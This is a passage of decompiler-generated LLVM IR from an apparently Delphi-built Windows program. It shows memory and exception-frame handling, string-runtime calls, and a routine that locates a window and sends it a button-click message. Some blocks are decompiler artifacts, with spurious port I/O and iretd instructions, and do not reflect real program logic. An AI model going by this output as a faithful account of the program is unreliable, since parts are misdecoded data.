  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %95, align 4, !insn.addr !980
  %96 = add i32 %esp.0.reload, -132, !insn.addr !981
  %97 = inttoptr i32 %96 to i32*, !insn.addr !981
  store i32 ptrtoint (i32* @global_var_405b10 to i32), i32* %97, align 4, !insn.addr !981
  %98 = add i32 %esp.0.reload, -136, !insn.addr !982
  %99 = inttoptr i32 %98 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_405a70 to i32), i32* %99, align 4, !insn.addr !982
  %100 = call i32 @"@LStrCatN"(), !insn.addr !983
  %101 = call i32 @function_405724(), !insn.addr !984
  %102 = call i32 @function_4057a4(), !insn.addr !985
  %103 = call i32 @function_405724(), !insn.addr !986
  %104 = call i32 @function_4057a4(), !insn.addr !987
  %105 = call i32 @function_405718(), !insn.addr !988
  store i32* %99, i32** %.pre-phi.reg2mem, !insn.addr !989
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !989
  br label %dec_label_pc_405a10, !insn.addr !989

dec_label_pc_405a10:                              ; preds = %dec_label_pc_40584e, %dec_label_pc_4057e0
  %106 = add i32 %esp.0.reload, -16, !insn.addr !990
  %107 = inttoptr i32 %106 to i32*, !insn.addr !990
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %108 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !991
  call void @__writefsdword(i32 0, i32 %108), !insn.addr !992
  %109 = add i32 %esp.1.reload, 8, !insn.addr !993
  %110 = inttoptr i32 %109 to i32*, !insn.addr !993
  store i32 4217420, i32* %110, align 4, !insn.addr !993
  %111 = call i32 @"@LStrArrayClr"(), !insn.addr !994
  %112 = call i32 @"@LStrArrayClr"(), !insn.addr !995
  %113 = call i32 @"@LStrArrayClr"(), !insn.addr !996
  ret i32 %113, !insn.addr !997
}

define i32 @function_405a45() local_unnamed_addr {
dec_label_pc_405a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !998
  ret i32 %0, !insn.addr !998
}

define i32 @function_405a4a() local_unnamed_addr {
dec_label_pc_405a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !999
}

define i32 @function_405a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1000
}

define i32 @function_405b17() local_unnamed_addr {
dec_label_pc_405b17:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1001
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1001
  store i32 %3, i32* %4, align 4, !insn.addr !1001
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1002
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1002
  %9 = add i8 %6, %8, !insn.addr !1002
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1002
  store i8 %9, i8* %10, align 1, !insn.addr !1002
  %11 = add i32 %2, 85, !insn.addr !1003
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1003
  %13 = load i8, i8* %12, align 1, !insn.addr !1003
  %14 = trunc i32 %1 to i8, !insn.addr !1003
  %15 = add i8 %13, %14, !insn.addr !1003
  store i8 %15, i8* %12, align 1, !insn.addr !1003
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1004
  store i32 %16, i32* %stack_var_-16, align 4, !insn.addr !1004
  %17 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1004
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1005
  %18 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1006
  %19 = add i32 %18, 1, !insn.addr !1006
  %20 = icmp eq i32 %19, 0, !insn.addr !1006
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1006
  %21 = icmp eq i1 %20, false, !insn.addr !1007
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1007

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1008
  %23 = call i32 @"@LStrClr"(), !insn.addr !1009
  br label %dec_label_pc_405b51, !insn.addr !1009

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1010
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1011
  ret i32 0, !insn.addr !1012
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1013
  ret i32 %0, !insn.addr !1013
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1014
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1015
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1016
  %2 = add i32 %1, -1, !insn.addr !1016
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1016
  ret i32 %0, !insn.addr !1017
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1018
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1019
  %2 = icmp eq i32 %0, 0, !insn.addr !1020
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1021
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1021

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1022
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1023
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1023
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1023
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1024
  %7 = icmp eq i1 %6, false, !insn.addr !1025
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1026
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1026

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1027
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1027
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1028
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1028
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1029
  %13 = icmp eq i1 %12, false, !insn.addr !1030
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1031
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1031

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1032
  %15 = add i32 %14, 22, !insn.addr !1033
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1034
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1034
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1035
  %18 = icmp eq i32* %17, null, !insn.addr !1036
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1037
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1037

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1038
  %20 = icmp eq i32* %19, null, !insn.addr !1039
  %21 = icmp eq i1 %20, false, !insn.addr !1040
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1040

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1041
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1041
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1041
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1042
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1043
  br label %dec_label_pc_405c7a, !insn.addr !1043

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1035
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1038
  store i32 20, i32* %19, align 4, !insn.addr !1044
  %27 = add i32 %26, 4, !insn.addr !1045
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1045
  store i32 0, i32* %28, align 4, !insn.addr !1045
  %29 = add i32 %26, 8, !insn.addr !1046
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1046
  store i32 0, i32* %30, align 4, !insn.addr !1046
  %31 = add i32 %26, 12, !insn.addr !1047
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1047
  store i32 0, i32* %32, align 4, !insn.addr !1047
  %33 = add i32 %26, 16, !insn.addr !1048
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1048
  store i32 0, i32* %34, align 4, !insn.addr !1048
  %35 = call i32 @function_4036c8(), !insn.addr !1049
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1050
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1050
  %37 = add i32 %26, 20, !insn.addr !1051
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1052
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1053
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1054
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1055
  %42 = call i32 @function_406ea8(i32 4218000, i32 2000, i32 -1), !insn.addr !1056
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1057
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1057
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1058
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1058
  %46 = icmp eq i1 %45, false, !insn.addr !1059
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1060
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1060

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1061
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1061
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1062
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1062
  br label %dec_label_pc_405c7a, !insn.addr !1062

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1063
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1063
  %51 = load i32, i32* %50, align 4, !insn.addr !1063
  ret i32 %51, !insn.addr !1064
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1065
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1065
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1065
  store i8 %6, i8* %7, align 1, !insn.addr !1065
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1066
  %10 = udiv i32 %4, 256, !insn.addr !1066
  %11 = trunc i32 %10 to i8, !insn.addr !1066
  %12 = add i8 %9, %11, !insn.addr !1066
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1066
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1066
  store i8 %12, i8* %14, align 1, !insn.addr !1066
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1067
  %17 = add i32 %4, 6, !insn.addr !1067
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1067
  %19 = zext i1 %16 to i32, !insn.addr !1067
  %20 = and i32 %4, -65536, !insn.addr !1067
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1068
  %23 = or i1 %16, %22, !insn.addr !1068
  %24 = add i32 %18, 6, !insn.addr !1068
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1068
  %26 = zext i1 %23 to i32, !insn.addr !1068
  %27 = and i32 %25, 15, !insn.addr !1068
  %28 = or i32 %27, %20, !insn.addr !1068
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1068
  %31 = or i32 %28, %30, !insn.addr !1068
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1069
  %33 = load i8, i8* %32, align 1, !insn.addr !1069
  %34 = trunc i32 %27 to i8, !insn.addr !1069
  %35 = xor i8 %33, %34, !insn.addr !1069
  store i8 %35, i8* %32, align 1, !insn.addr !1069
  %36 = add i32 %0, 1311123697, !insn.addr !1070
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1070
  %38 = load i8, i8* %37, align 1, !insn.addr !1070
  %39 = udiv i32 %3, 256, !insn.addr !1070
  %40 = trunc i32 %39 to i8, !insn.addr !1070
  %41 = add i8 %38, %40, !insn.addr !1070
  store i8 %41, i8* %37, align 1, !insn.addr !1070
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1071
  %43 = load i32, i32* %42, align 4, !insn.addr !1071
  %44 = sub i32 %43, %31, !insn.addr !1071
  store i32 %44, i32* %42, align 4, !insn.addr !1071
  %45 = add i32 %3, 117, !insn.addr !1072
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1072
  %47 = load i8, i8* %46, align 1, !insn.addr !1072
  %48 = add i8 %47, %34, !insn.addr !1072
  %49 = icmp eq i8 %48, 0, !insn.addr !1072
  store i8 %48, i8* %46, align 1, !insn.addr !1072
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1073

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1074
  %51 = trunc i32 %3 to i16, !insn.addr !1075
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1075
  %53 = load i32, i32* %52, align 4, !insn.addr !1075
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1075
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1076
  %55 = load i8, i8* %54, align 1, !insn.addr !1076
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1076
  %56 = load i8, i8* %32, align 1, !insn.addr !1077
  %57 = add i8 %56, %34, !insn.addr !1077
  store i8 %57, i8* %32, align 1, !insn.addr !1077
  %58 = call i32 @__asm_iretd(), !insn.addr !1078
  %59 = add i32 %2, -117, !insn.addr !1079
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1079
  %61 = load i8, i8* %60, align 1, !insn.addr !1079
  %62 = add i8 %61, -69, !insn.addr !1079
  store i8 %62, i8* %60, align 1, !insn.addr !1079
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1080
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1081
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1081
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1081
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1082
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1083
  %67 = add i32 %66, 1, !insn.addr !1083
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1083
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1084
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1085
  ret i32 0, !insn.addr !1086

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1087
  store i32 %69, i32* %ebx, align 4, !insn.addr !1088
  %70 = icmp slt i32 %69, 0, !insn.addr !1089
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1090

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1091
  store i32 %71, i32* %ebx, align 4, !insn.addr !1091
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1092
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1093
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1094
  %75 = call i32 @function_403c90(), !insn.addr !1095
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1096
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1097
  br label %dec_label_pc_405d79, !insn.addr !1097

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1098
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1099
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1099
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1099
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1100
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1101
  %3 = add i32 %2, 1, !insn.addr !1101
  %4 = icmp eq i32 %3, 0, !insn.addr !1101
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1101
  %5 = icmp eq i1 %4, false, !insn.addr !1102
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1102

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1103
  br label %dec_label_pc_405da9, !insn.addr !1103

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1104
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1105
  ret i32 0, !insn.addr !1106
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1107
  ret i32 %0, !insn.addr !1107
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1108
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1109
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1110
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1110
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1110
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1111
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1112
  %3 = add i32 %2, -1, !insn.addr !1112
  %4 = icmp eq i32 %2, 0, !insn.addr !1112
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1112
  %5 = icmp eq i1 %4, false, !insn.addr !1113
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1113

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1114
  br label %dec_label_pc_405df4, !insn.addr !1115

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1116
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1117
  ret i32 0, !insn.addr !1118
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1119
  ret i32 %0, !insn.addr !1119
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1120
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1121
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1122
}

define i32 @function_405e0f(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0f:
  %esp.0.reg2mem = alloca i32, !insn.addr !1123
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i1 @__decompiler_undefined_function_1()
  %5 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  call void @__asm_out(i32 177, i32 %3), !insn.addr !1123
  %6 = select i1 %5, i32 -4, i32 4, !insn.addr !1124
  %7 = add i32 %6, %0, !insn.addr !1124
  store i32 %7, i32* %esi, align 4, !insn.addr !1124
  br i1 %4, label %dec_label_pc_405e7e, label %dec_label_pc_405e15, !insn.addr !1125

dec_label_pc_405e15:                              ; preds = %dec_label_pc_405e0f
  %8 = trunc i32 %7 to i8
  %9 = bitcast i32* %esi to i8*
  %10 = trunc i32 %0 to i8, !insn.addr !1126
  %11 = add i8 %8, %10, !insn.addr !1126
  %12 = inttoptr i32 %0 to i8*, !insn.addr !1126
  store i8 %11, i8* %12, align 1, !insn.addr !1126
  %13 = load i8, i8* %9, align 4, !insn.addr !1127
  %14 = add i8 %13, %10, !insn.addr !1127
  store i8 %14, i8* %12, align 1, !insn.addr !1127
  %15 = load i8, i8* %9, align 4, !insn.addr !1128
  %16 = add i8 %15, %10, !insn.addr !1128
  store i8 %16, i8* %12, align 1, !insn.addr !1128
  %17 = load i8, i8* %9, align 4, !insn.addr !1129
  %18 = add i8 %17, %10, !insn.addr !1129
  store i8 %18, i8* %12, align 1, !insn.addr !1129
  %19 = load i8, i8* %9, align 4, !insn.addr !1130
  %20 = add i8 %19, %10, !insn.addr !1130
  store i8 %20, i8* %12, align 1, !insn.addr !1130
  %21 = load i8, i8* %9, align 4, !insn.addr !1131
  %22 = add i8 %21, %10, !insn.addr !1131
  store i8 %22, i8* %12, align 1, !insn.addr !1131
  %23 = load i8, i8* %9, align 4, !insn.addr !1132
  %24 = add i8 %23, %10, !insn.addr !1132
  store i8 %24, i8* %12, align 1, !insn.addr !1132
  %25 = load i8, i8* %9, align 4, !insn.addr !1133
  %26 = add i8 %25, %10, !insn.addr !1133
  store i8 %26, i8* %12, align 1, !insn.addr !1133
  %27 = load i8, i8* %9, align 4, !insn.addr !1134
  %28 = add i8 %27, %10, !insn.addr !1134
  store i8 %28, i8* %12, align 1, !insn.addr !1134
  %29 = load i8, i8* %9, align 4, !insn.addr !1135
  %30 = add i8 %29, %10, !insn.addr !1135
  store i8 %30, i8* %12, align 1, !insn.addr !1135
  %31 = load i8, i8* %9, align 4, !insn.addr !1136
  %32 = add i8 %31, %10, !insn.addr !1136
  store i8 %32, i8* %12, align 1, !insn.addr !1136
  %33 = load i8, i8* %9, align 4, !insn.addr !1137
  %34 = add i8 %33, %10, !insn.addr !1137
  store i8 %34, i8* %12, align 1, !insn.addr !1137
  %35 = load i8, i8* %9, align 4, !insn.addr !1138
  %36 = add i8 %35, %10, !insn.addr !1138
  store i8 %36, i8* %12, align 1, !insn.addr !1138
  %37 = load i8, i8* %9, align 4, !insn.addr !1139
  %38 = add i8 %37, %10, !insn.addr !1139
  store i8 %38, i8* %12, align 1, !insn.addr !1139
  %39 = load i8, i8* %9, align 4, !insn.addr !1140
  %40 = add i8 %39, %10, !insn.addr !1140
  store i8 %40, i8* %12, align 1, !insn.addr !1140
  %41 = load i8, i8* %9, align 4, !insn.addr !1141
  %42 = add i8 %41, %10, !insn.addr !1141
  store i8 %42, i8* %12, align 1, !insn.addr !1141
  %43 = load i8, i8* %9, align 4, !insn.addr !1142
  %44 = add i8 %43, %10, !insn.addr !1142
  store i8 %44, i8* %12, align 1, !insn.addr !1142
  %45 = load i8, i8* %9, align 4, !insn.addr !1143
  %46 = add i8 %45, %10, !insn.addr !1143
  store i8 %46, i8* %12, align 1, !insn.addr !1143
  %47 = load i8, i8* %9, align 4, !insn.addr !1144
  %48 = add i8 %47, %10, !insn.addr !1144
  store i8 %48, i8* %12, align 1, !insn.addr !1144
  %49 = load i8, i8* %9, align 4, !insn.addr !1145
  %50 = add i8 %49, %10, !insn.addr !1145
  store i8 %50, i8* %12, align 1, !insn.addr !1145
  %51 = load i8, i8* %9, align 4, !insn.addr !1146
  %52 = add i8 %51, %10, !insn.addr !1146
  store i8 %52, i8* %12, align 1, !insn.addr !1146
  %53 = load i8, i8* %9, align 4, !insn.addr !1147
  %54 = add i8 %53, %10, !insn.addr !1147
  store i8 %54, i8* %12, align 1, !insn.addr !1147
  %55 = load i8, i8* %9, align 4, !insn.addr !1148
  %56 = add i8 %55, %10, !insn.addr !1148
  store i8 %56, i8* %12, align 1, !insn.addr !1148
  %57 = load i8, i8* %9, align 4, !insn.addr !1149
  %58 = add i8 %57, %10, !insn.addr !1149
  store i8 %58, i8* %12, align 1, !insn.addr !1149
  %59 = load i8, i8* %9, align 4, !insn.addr !1150
  %60 = add i8 %59, %10, !insn.addr !1150
  store i8 %60, i8* %12, align 1, !insn.addr !1150
  %61 = load i8, i8* %9, align 4, !insn.addr !1151
  %62 = add i8 %61, %10, !insn.addr !1151
  store i8 %62, i8* %12, align 1, !insn.addr !1151
  %63 = load i8, i8* %9, align 4, !insn.addr !1152
  %64 = add i8 %63, %10, !insn.addr !1152
  store i8 %64, i8* %12, align 1, !insn.addr !1152
  %65 = load i8, i8* %9, align 4, !insn.addr !1153
  %66 = add i8 %65, %10, !insn.addr !1153
  store i8 %66, i8* %12, align 1, !insn.addr !1153
  %67 = load i8, i8* %9, align 4, !insn.addr !1154
  %68 = add i8 %67, %10, !insn.addr !1154
  store i8 %68, i8* %12, align 1, !insn.addr !1154
  store i8* null, i8** %stack_var_-20, align 4, !insn.addr !1155
  %69 = call i32 @__readfsdword(i32 0), !insn.addr !1156
  store i32 %69, i32* %stack_var_-48, align 4, !insn.addr !1156
  %70 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1156
  call void @__writefsdword(i32 0, i32 %70), !insn.addr !1157
  %71 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1158
  ret i32 %71, !insn.addr !1158

dec_label_pc_405e7e:                              ; preds = %dec_label_pc_405e0f
  %72 = and i32 %0, -256, !insn.addr !1159
  %73 = inttoptr i32 %7 to i8*, !insn.addr !1160
  %74 = load i8, i8* %73, align 1, !insn.addr !1160
  %75 = zext i8 %74 to i32, !insn.addr !1160
  %76 = or i32 %72, %75, !insn.addr !1160
  %77 = select i1 %5, i32 -1, i32 1, !insn.addr !1160
  %78 = add i32 %7, %77, !insn.addr !1160
  store i32 %78, i32* %esi, align 4, !insn.addr !1160
  %79 = inttoptr i32 %76 to i8*, !insn.addr !1161
  %80 = load i8, i8* %79, align 1, !insn.addr !1161
  %81 = add i8 %80, %74, !insn.addr !1161
  store i8 %81, i8* %79, align 1, !insn.addr !1161
  %82 = add i32 %1, -963905451, !insn.addr !1162
  %83 = inttoptr i32 %82 to i8*, !insn.addr !1162
  %84 = load i8, i8* %83, align 1, !insn.addr !1162
  %85 = trunc i32 %2 to i8, !insn.addr !1162
  %86 = add i8 %84, %85, !insn.addr !1162
  store i8 %86, i8* %83, align 1, !insn.addr !1162
  %87 = call i32 @function_406f9c(), !insn.addr !1163
  %88 = call i32 @"@LStrPos"(), !insn.addr !1164
  %89 = call i32 @"@LStrPos"(), !insn.addr !1165
